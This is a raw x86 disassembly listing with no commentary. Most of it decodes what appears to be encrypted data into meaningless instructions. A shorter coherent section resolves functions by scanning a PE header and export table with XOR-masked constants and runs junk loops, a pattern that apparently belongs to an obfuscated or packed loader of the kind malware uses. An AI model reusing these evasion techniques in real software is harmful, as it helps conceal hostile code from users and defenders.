  407861:	mov    bl,0xd1
  407863:	jb     0x4078a3
  407865:	dec    ecx
  407866:	inc    edx
  407867:	rcl    BYTE PTR [ebx+0x57820808],cl
  40786d:	mov    bl,0xad
  40786f:	popf   
  407870:	mov    gs,WORD PTR [ecx-0x77feb966]
  407876:	fist   DWORD PTR ds:0x1a3d7bcb
  40787c:	shr    BYTE PTR [edx+0x9465e2c],0x98
  407883:	xchg   ebx,eax
  407884:	cwde   
  407885:	mov    ?,esi
  407887:	mov    esi,0x38ced951
  40788c:	ficom  WORD PTR [ebp+0x5f73ebb7]
  407892:	call   0x4309:0xd561f4e
  407899:	jne    0x407899
  40789b:	sbb    eax,0x484502d0
  4078a0:	int    0x4c
  4078a2:	loop   0x4078f7
  4078a4:	adc    bl,dh
  4078a6:	cli    
  4078a7:	cwde   
  4078a8:	xor    eax,0x2def6c0
  4078ad:	xlat   BYTE PTR ds:[ebx]
  4078ae:	and    ecx,0xffffffb2
  4078b1:	je     0x407882
  4078b3:	jg     0x407875
  4078b5:	hlt    
  4078b6:	xlat   BYTE PTR ds:[ebx]
  4078b7:	loope  0x4078af
  4078b9:	fbstp  TBYTE PTR [esi+0x4ca9cd3e]
  4078bf:	xchg   edi,eax
  4078c0:	mov    cl,0xfc
  4078c2:	mov    al,ds:0xb641ed18
  4078c7:	sbb    eax,0xd85271c8
  4078cc:	fs xchg edi,eax
  4078ce:	fcomi  st,st(3)
  4078d0:	cmp    al,BYTE PTR [ebp+0x7c]
  4078d3:	not    al
  4078d5:	cmc    
  4078d6:	xchg   BYTE PTR [edi],ch
  4078d8:	test   eax,0xc0db96cb
  4078dd:	jae    0x4078d4
  4078df:	and    DWORD PTR [eax],esp
  4078e1:	in     eax,0x9e
  4078e3:	iret   
  4078e4:	or     al,0xd9
  4078e6:	push   0xc71271c3
  4078eb:	in     eax,0x16
  4078ed:	in     al,0xde
  4078ef:	in     al,dx
  4078f0:	scas   eax,DWORD PTR es:[edi]
  4078f1:	mov    al,ds:0x31223b1e
  4078f6:	xor    edi,DWORD PTR [edi-0x5198c807]
  4078fc:	cmp    DWORD PTR [edx+0x4b122b4],ebp
  407902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407903:	ins    BYTE PTR es:[edi],dx
  407904:	adc    DWORD PTR [esi],edi
  407906:	add    DWORD PTR [edi+eax*4],edi
  407909:	lea    esi,[ecx+0x3de23f88]
  40790f:	pop    ebp
  407910:	test   DWORD PTR [ecx+0x6db3fb6e],edi
  407916:	ins    DWORD PTR es:[edi],dx
  407917:	rcl    DWORD PTR [ebx-0x628005ac],0x53
  40791e:	mov    esi,0x7b783ec3
  407923:	adc    edx,edi
  407925:	nop
  407926:	fcomi  st,st(0)
  407928:	mov    esp,0xc5a6163
  40792d:	lds    ebx,FWORD PTR ds:0x7783ba55
  407933:	mov    eax,ds:0x7cb70705
  407938:	inc    eax
  407939:	mov    esi,0x4dca2982
  40793e:	jp     0x407922
  407940:	or     eax,0x1ea361a5
  407945:	and    DWORD PTR ds:0xbeddac46,ebx
  40794b:	mov    eax,ds:0x8f2641cb
  407950:	ret    0xa29d
  407953:	dec    eax
  407954:	out    dx,al
  407955:	push   ecx
  407956:	cwde   
  407957:	push   cs
  407958:	mov    ebp,?
  40795a:	push   ss
  40795b:	call   0x317d:0xa5fe
  407961:	(bad)  
  407962:	mov    edi,0x5de175be
  407967:	sub    ecx,DWORD PTR [edx+0x1be5e03]
  40796d:	add    al,0x2
  40796f:	inc    ebx
  407970:	fsub   QWORD PTR [ebx-0x6bc86a39]
  407976:	cli    
  407977:	adc    eax,0x38c5084a
  40797c:	xor    eax,0xcc650d74
  407981:	imul   edi,DWORD PTR [ebx],0xffffff93
  407984:	fld    DWORD PTR [ebp-0x66ee1ca4]
  40798a:	dec    ecx
  40798b:	xlat   BYTE PTR ds:[ebx]
  40798c:	jl     0x4079ad
  40798e:	xchg   esp,eax
  40798f:	(bad)  
  407990:	(bad)  [esi]
  407992:	ret    
  407993:	repz fldcw WORD PTR [ecx]
  407996:	jmp    DWORD PTR ds:0x86287118
  40799c:	inc    edx
  40799d:	jbe    0x407981
  40799f:	dec    ebp
  4079a0:	pop    ecx
  4079a1:	clc    
  4079a2:	mov    ecx,DWORD PTR [edi]
  4079a4:	loope  0x4079c1
  4079a6:	not    edx
  4079a8:	or     al,0xa9
  4079aa:	or     al,dl
  4079ac:	call   DWORD PTR [esi-0xe245ef]
  4079b2:	hlt    
  4079b3:	xchg   ebp,eax
  4079b4:	rol    BYTE PTR [ebx],0x8b
  4079b7:	cs push 0xffffffb4
  4079ba:	jbe    0x407956
  4079bc:	ins    DWORD PTR es:[edi],dx
  4079bd:	xor    DWORD PTR [edx+eiz*4],eax
  4079c0:	repnz fstp DWORD PTR [edx+edi*8+0x45]
  4079c5:	and    eax,0x6cf15df1
  4079ca:	jge    0x4079a3
  4079cc:	dec    ebx
  4079cd:	in     al,0x58
  4079cf:	cmp    dl,ah
  4079d1:	sub    BYTE PTR [ebp+ecx*8-0x24d71907],cl
  4079d8:	jg     0x4079f2
  4079da:	fs gs in al,dx
  4079dd:	xchg   ecx,eax
  4079de:	outs   dx,BYTE PTR ds:[esi]
  4079df:	bound  esi,QWORD PTR [ebp+0x6c]
  4079e2:	inc    eax
  4079e3:	pop    ebp
  4079e4:	fadd   QWORD PTR [esi-0x3cfdd58f]
  4079ea:	popa   
  4079eb:	cmp    BYTE PTR [edx+0x3e],dh
  4079ee:	ffree  st(0)
  4079f0:	(bad)  
  4079f2:	jmp    0xbb1f:0x4890a98
  4079f9:	or     BYTE PTR [edx],al
  4079fb:	add    dl,0xab
  4079fe:	push   esp
  4079ff:	push   0xb266765d
  407a04:	sar    BYTE PTR [esi+0x1d98022b],0xbe
  407a0b:	mov    esi,0xc6011e7
  407a10:	(bad)  
  407a12:	imul   esi,DWORD PTR [esi+0x6d],0xffffff81
  407a16:	dec    ebp
  407a17:	call   0x81e5:0x9ab19766
  407a1e:	mov    dh,0x7b
  407a20:	sub    BYTE PTR [ecx+0x3a],bl
  407a23:	popf   
  407a24:	sar    BYTE PTR [ecx+0x5726fbc],0x86
  407a2b:	push   es
  407a2c:	push   ds
  407a2d:	push   eax
  407a2e:	add    DWORD PTR [ebp-0x5b],eax
  407a31:	mov    eax,0xec4e926e
  407a36:	jne    0x407a5b
  407a38:	mov    eax,ds:0xe37884d5
  407a3d:	int    0x83
  407a3f:	ror    DWORD PTR [ecx+0xc],0x7d
  407a43:	out    0xfc,eax
  407a45:	mov    al,0xbb
  407a47:	hlt    
  407a48:	out    0xc7,al
  407a4a:	push   ss
  407a4b:	push   ebp
  407a4c:	xor    DWORD PTR [ebx],eax
  407a4e:	mov    bl,0xdb
  407a50:	jbe    0x407a9d
  407a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a53:	adc    al,BYTE PTR [ebp+0x6c]
  407a56:	and    eax,0x8bdb9d0f
  407a5b:	cmp    DWORD PTR [ecx+0x3b],edi
  407a5e:	dec    esi
  407a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a60:	cmp    ebx,DWORD PTR [ebx-0x66fe0b2e]
  407a66:	les    edi,FWORD PTR [ebp+0x3b]
  407a69:	push   esp
  407a6a:	ror    BYTE PTR [ecx-0x2b4bc628],1
  407a70:	pop    edx
  407a71:	push   esp
  407a72:	imul   ecx,edx,0xffffffba
  407a75:	jae    0x407a49
  407a77:	xor    edi,eax
  407a79:	and    al,0xcb
  407a7b:	adc    dh,dl
  407a7d:	(bad)
  407a80:	inc    ebp
  407a81:	fnstsw WORD PTR [edx-0x43]
  407a84:	mov    esi,ecx
  407a86:	and    eax,0x163b4210
  407a8b:	(bad)  
  407a8c:	aaa    
  407a8d:	jecxz  0x407a5e
  407a8f:	fst    QWORD PTR [edi-0x42b43b50]
  407a95:	cdq    
  407a96:	and    DWORD PTR [ebp+0x67328e8b],eax
  407a9c:	imul   esi,esp,0x37
  407a9f:	and    eax,0x1c33ea07
  407aa4:	lock cmp al,0xc0
  407aa7:	hlt    
  407aa8:	repz cdq 
  407aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aab:	mov    eax,0xdc568fb5
  407ab0:	fst    DWORD PTR [ebp-0x61]
  407ab3:	mov    ch,0x63
  407ab5:	push   esp
  407ab6:	pop    edx
  407ab7:	push   ss
  407ab8:	fsub   QWORD PTR [edx+esi*2]
  407abb:	mov    ds:0xa2dcebc9,al
  407ac0:	sti    
  407ac1:	mov    ecx,0x7c09d218
  407ac6:	inc    esp
  407ac7:	cmp    al,BYTE PTR [edi-0x4d]
  407aca:	ja     0x407a95
  407acc:	mov    eax,0x13c2ab85
  407ad1:	jo     0x407a6a
  407ad3:	popf   
  407ad4:	adc    esi,DWORD PTR [eax-0x59]
  407ad7:	jmp    0x407a67
  407ad9:	sub    edi,DWORD PTR [eax+0x1b]
  407adc:	xchg   edi,eax
  407add:	mov    edx,0x2f5acbce
  407ae2:	pusha  
  407ae3:	imul   esi,eax,0x34e2dd8
  407ae9:	push   edx
  407aea:	nop
  407aeb:	mov    al,0x82
  407aed:	mov    ah,0x94
  407aef:	adc    DWORD PTR ds:0xc5f3374,0xee221b5c
  407af9:	pop    esp
  407afa:	ficomp DWORD PTR [edi+ebx*1+0x45]
  407afe:	loopne 0x407afe
  407b00:	xchg   ebp,eax
  407b01:	push   0x97814aac
  407b06:	fcom   QWORD PTR [ebx+0x29]
  407b09:	shl    BYTE PTR [ecx+eiz*4+0x2f],0x15
  407b0e:	ja     0x407b88
  407b10:	sub    cl,BYTE PTR [edx+0x438a8985]
  407b16:	inc    edx
  407b17:	mov    eax,0xddc12794
  407b1c:	pop    esi
  407b1d:	ins    BYTE PTR es:[edi],dx
  407b1e:	dec    eax
  407b1f:	sbb    ebp,DWORD PTR [eax-0x5b]
  407b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b23:	xchg   ebx,eax
  407b24:	jae    0x407ac8
  407b26:	add    ecx,DWORD PTR [edx-0x2026ba0e]
  407b2c:	pop    edx
  407b2d:	push   es
  407b2e:	mov    eax,0xf545f5f6
  407b33:	rol    DWORD PTR [ecx-0x5e59986],cl
  407b39:	aam    0xc3
  407b3b:	jb     0x407aeb
  407b3d:	xor    edi,ecx
  407b3f:	add    edi,0x3272db
  407b45:	not    edi
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0x65d070e0
  407e5b:	xchg   ecx,eax
  407e5c:	cmp    eax,0x7c7c22cf
  407e61:	aam    0x5f
  407e63:	jl     0x407ee1
  407e65:	fisub  WORD PTR [ebx+0x26]
  407e68:	xchg   ebp,eax
  407e69:	adc    bl,cl
  407e6b:	mov    BYTE PTR [ebx-0x50b9f2b6],bl
  407e71:	push   ss
  407e72:	lea    ebp,[eax+eiz*8-0x35]
  407e76:	cli    
  407e77:	and    DWORD PTR [ebp-0x1008aeb4],esp
  407e7d:	or     ebx,DWORD PTR [esi+0x58e30613]
  407e83:	pop    ebx
  407e84:	xor    al,0x10
  407e86:	mov    ds:0x2263e696,eax
  407e8b:	xchg   DWORD PTR [ecx+edx*4],ecx
  407e8e:	add    BYTE PTR [ecx],bl
  407e90:	out    0xe5,al
  407e92:	retf   
  407e93:	popf   
  407e94:	dec    esp
  407e95:	(bad)  
  407e96:	es mov edx,0x4857624f
  407e9c:	cwde   
  407e9d:	fs gs lahf 
  407ea0:	jbe    0x407ebb
  407ea2:	stos   BYTE PTR es:[edi],al
  407ea3:	push   edx
  407ea4:	jbe    0x407ee7
  407ea6:	fwait
  407ea7:	add    eax,DWORD PTR [ecx]
  407ea9:	cmp    BYTE PTR [ecx-0x39],0x33
  407ead:	stc    
  407eae:	in     al,0x33
  407eb0:	repz pop ecx
  407eb2:	mov    ah,0x6d
  407eb4:	fist   DWORD PTR [edi-0x59f93493]
  407eba:	pusha  
  407ebb:	inc    esi
  407ebc:	popa   
  407ebd:	inc    ecx
  407ebe:	push   esp
  407ebf:	mov    BYTE PTR ds:0xab3c0548,dh
  407ec5:	in     eax,0x7f
  407ec7:	enter  0xa50c,0xe4
  407ecb:	jle    0x407e5a
  407ecd:	xor    ah,al
  407ecf:	sub    DWORD PTR [esi],eax
  407ed1:	aas    
  407ed2:	loop   0x407ec7
  407ed4:	pop    ebx
  407ed5:	jle    0x407f1d
  407ed7:	xchg   edi,eax
  407ed8:	inc    ecx
  407ed9:	je     0x407e69
  407edb:	shl    ch,0x26
  407ede:	gs mov edi,?
  407ee1:	into   
  407ee2:	add    al,0xf9
  407ee4:	jbe    0x407f0a
  407ee6:	gs mov cl,0xe9
  407ee9:	jmp    0x407f49
  407eeb:	push   edi
  407eec:	pop    esi
  407eed:	in     eax,0x33
  407eef:	inc    esi
  407ef0:	ret    0xb928
  407ef3:	xor    ah,cl
  407ef5:	retf   
  407ef6:	cdq    
  407ef7:	cmp    esp,edi
  407ef9:	mov    bh,0xd6
  407efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407efc:	mov    al,ds:0xe5d8a356
  407f01:	mov    al,ds:0x68f318
  407f06:	mov    al,ds:0x1c849e32
  407f0b:	ss add bh,ch
  407f0e:	xor    esi,DWORD PTR ds:0xc940b039
  407f14:	mov    edi,0xea230b94
  407f19:	sub    ecx,DWORD PTR [edx-0x75d6c777]
  407f1f:	or     BYTE PTR [ebx-0x73],cl
  407f22:	ins    BYTE PTR es:[edi],dx
  407f23:	test   eax,0xabd09252
  407f28:	loope  0x407f19
  407f2a:	(bad)  [ebx]
  407f2c:	add    ah,BYTE PTR [esi]
  407f2e:	faddp  st(3),st
  407f30:	ins    DWORD PTR es:[edi],dx
  407f31:	cmp    BYTE PTR [edx],dl
  407f33:	xchg   ebp,eax
  407f34:	cli    
  407f35:	dec    edi
  407f36:	cld    
  407f37:	out    0xc0,al
  407f39:	fmul   st(1),st
  407f3b:	or     al,0x36
  407f3d:	aas    
  407f3e:	rol    BYTE PTR [edx-0x54],0x72
  407f42:	inc    esp
  407f43:	mov    cl,0xdd
  407f45:	into   
  407f46:	dec    ecx
  407f47:	jmp    0x407f91
  407f49:	fs inc ecx
  407f4b:	sbb    eax,0x320fb7a4
  407f50:	out    dx,al
  407f51:	jmp    0xa306:0x77803273
  407f58:	pushf  
  407f59:	and    BYTE PTR [edx+0x7],al
  407f5c:	stos   DWORD PTR es:[edi],eax
  407f5d:	cmp    BYTE PTR [eax+0x35a56bcc],bl
  407f63:	adc    esp,DWORD PTR [ecx]
  407f65:	mov    ds:0xab22b44,eax
  407f6a:	clc    
  407f6b:	fs mov ecx,0x5f655426
  407f71:	mov    dh,0x40
  407f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f74:	fidiv  DWORD PTR [ebp+0x4a]
  407f77:	add    eax,0xd5276116
  407f7c:	jne    0x407f41
  407f7e:	aaa    
  407f7f:	mov    eax,ds:0xc843cfbd
  407f84:	les    ecx,FWORD PTR [di]
  407f87:	or     DWORD PTR [ecx-0x53],esp
  407f8a:	frstor [edx]
  407f8c:	iret   
  407f8d:	lahf   
  407f8e:	fs pop edi
  407f90:	xor    ah,BYTE PTR [esi]
  407f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f93:	jae    0x407ff3
  407f95:	adc    cl,cl
  407f97:	fcom   DWORD PTR [ebp+0xed2e2a4]
  407f9d:	push   esp
  407f9e:	mov    eax,0xf70e8ed7
  407fa3:	popa   
  407fa4:	pop    esp
  407fa5:	mov    ds:0x79f75e06,eax
  407faa:	jne    0x407f78
  407fac:	test   eax,0x4fda1af0
  407fb1:	pop    edx
  407fb2:	or     al,0x37
  407fb4:	lea    ebx,[esi+0x53f1409a]
  407fba:	fiadd  DWORD PTR gs:[ecx-0x10]
  407fbe:	aaa    
  407fbf:	sub    cl,bh
  407fc1:	push   eax
  407fc2:	rol    BYTE PTR [esi+0x78],1
  407fc5:	pop    esi
  407fc6:	xor    eax,0xa3fb5c4d
  407fcb:	lds    ebx,FWORD PTR [ebp+edi*8+0x553b387f]
  407fd2:	and    bh,cl
  407fd4:	mov    edi,0x2bb2f0c9
  407fd9:	cmc    
  407fda:	(bad)  
  407fdb:	ins    DWORD PTR es:[edi],dx
  407fdc:	ins    BYTE PTR es:[edi],dx
  407fdd:	and    ecx,DWORD PTR [esi-0x692f9bc6]
  407fe3:	scas   eax,DWORD PTR es:[edi]
  407fe4:	rol    dl,cl
  407fe6:	xchg   al,bh
  407fe8:	loop   0x408007
  407fea:	lea    ebp,[ebp-0x1066fcbd]
  407ff0:	adc    DWORD PTR [ecx-0x79],esp
  407ff3:	xchg   ebx,eax
  407ff4:	js     0x407fd4
  407ff6:	mov    ch,0xef
  407ff8:	stos   BYTE PTR es:[edi],al
  407ff9:	add    DWORD PTR [edx],edi
  407ffb:	gs push cs
  407ffd:	shl    ah,cl
  407fff:	cs or  dh,bh
  408002:	or     dl,BYTE PTR [ecx+0x72]
  408005:	cwde   
  408006:	mov    bh,0x98
  408008:	aam    0x98
  40800a:	add    al,0x99
  40800c:	add    al,0x99
  40800e:	push   edi
  40800f:	mov    ds:0x50466b84,al
  408014:	adc    BYTE PTR [edx+0xc38b44e],0x5e
  40801b:	jmp    0x1d6d868c
  408020:	xchg   BYTE PTR [edi-0x2a96d004],dl
  408026:	sub    al,0x40
  408028:	or     BYTE PTR [eax],al
  40802a:	cmp    BYTE PTR [esi],dh
  40802c:	pop    ds
  40802d:	push   0xffffff89
  40802f:	dec    ecx
  408030:	jmp    0x49bfe36d
  408035:	and    esi,edi
  408037:	cmp    eax,0x6fabf826
  40803c:	cmp    DWORD PTR [ebx+0x11],edi
  40803f:	shl    BYTE PTR [edx],cl
  408041:	add    cl,dl
  408043:	sbb    ebx,DWORD PTR [eax+0x3b]
  408046:	jns    0x40800a
  408048:	push   0xffffffc5
  40804a:	inc    esp
  40804b:	stos   DWORD PTR es:[edi],eax
  40804c:	in     al,dx
  40804d:	cwde   
  40804e:	push   ebx
  40804f:	xchg   ebx,eax
  408050:	(bad)  
  408052:	mov    ah,0x5c
  408054:	cmp    al,0x79
  408056:	loopne 0x4080c2
  408058:	and    eax,0x898defff
  40805d:	test   eax,0x9b4c901a
  408062:	mov    edx,0xb5ec98b4
  408067:	dec    edx
  408068:	mov    ecx,0x793194db
  40806d:	cmc    
  40806e:	mov    edx,0xd62c9bce
  408073:	fs dec esi
  408075:	inc    ebx
  408076:	stc    
  408077:	arpl   WORD PTR [ecx+esi*8-0x2f],cx
  40807b:	pop    ebx
  40807c:	mov    al,0xcc
  40807e:	mov    ds:0xf87e873e,al
  408083:	scas   al,BYTE PTR es:[edi]
  408084:	sbb    al,0xfa
  408086:	add    bl,BYTE PTR [eax+ebx*1-0x16852588]
  40808d:	or     BYTE PTR [ebp+0x78],dh
  408090:	fcmovu st,st(4)
  408092:	dec    esi
  408093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408094:	pop    esi
  408095:	mov    cl,0x60
  408097:	jl     0x408097
  408099:	sub    ebx,DWORD PTR [ebx+ecx*8-0x2f]
  40809d:	sbb    ecx,DWORD PTR ds:0xbce6251c
  4080a3:	outs   dx,BYTE PTR ds:[esi]
  4080a4:	(bad)
  4080a7:	xchg   ecx,eax
  4080a8:	addr16 mov bl,0xa0
  4080ab:	(bad)  
  4080ac:	xchg   esi,eax
  4080ad:	fcom   QWORD PTR [edi+ebp*2]
  4080b0:	jle    0x408092
  4080b2:	test   BYTE PTR [esi+edi*4],dl
  4080b5:	jmp    0x2ced71db
  4080ba:	push   edi
  4080bb:	push   ss
  4080bc:	xor    BYTE PTR [eax+ebp*8],bl
  4080bf:	cmp    BYTE PTR [esi],0x98
  4080c2:	dec    edx
  4080c3:	mov    ds:0xc874b028,eax
  4080c8:	sbb    ch,BYTE PTR [esi-0x66f50e90]
  4080ce:	inc    esp
  4080cf:	imul   DWORD PTR cs:[ebx+0x6a2603bb]
  4080d6:	dec    ecx
  4080d7:	dec    esi
  4080d8:	jnp    0x4080e8
  4080da:	out    dx,al
  4080db:	bound  ecx,QWORD PTR [ebx-0x1f]
  4080de:	das    
  4080df:	dec    esp
  4080e0:	sub    edi,DWORD PTR [edi+eax*1-0x5f]
  4080e4:	int    0x6a
  4080e6:	mov    esp,DWORD PTR [ebx]
  4080e8:	dec    edi
  4080e9:	add    eax,0xbba86f05
  4080ee:	ins    DWORD PTR es:[edi],dx
  4080ef:	aad    0xe0
  4080f1:	shl    DWORD PTR [ecx],0x16
  4080f4:	and    DWORD PTR [ebx],ebx
  4080f6:	inc    esi
  4080f7:	in     al,0x21
  4080f9:	sti    
  4080fa:	outs   dx,DWORD PTR ds:[esi]
  4080fb:	js     0x4080bf
  4080fd:	inc    esi
  4080fe:	push   cs
  4080ff:	xor    DWORD PTR [ebx],esi
  408101:	pop    ss
  408102:	pushf  
  408103:	pop    ebp
  408104:	add    eax,DWORD PTR [eax]
  408106:	adc    eax,0xecbfd5b6
  40810b:	aam    0xeb
  40810d:	cld    
  40810e:	mov    dh,0x19
  408110:	loopne 0x40814b
  408112:	push   0x5447418c
  408117:	mov    esi,0x47aa9e7c
  40811c:	test   BYTE PTR [ebp+0x32],ch
  40811f:	stc    
  408120:	retf   
  408121:	aam    0x1b
  408123:	sti    
  408124:	and    eax,0xe71001e9
  40812a:	cwd    
  40812c:	mov    ah,0x6f
  40812e:	psubusb mm5,QWORD PTR [ecx+0x50f4b422]
  408135:	pop    esi
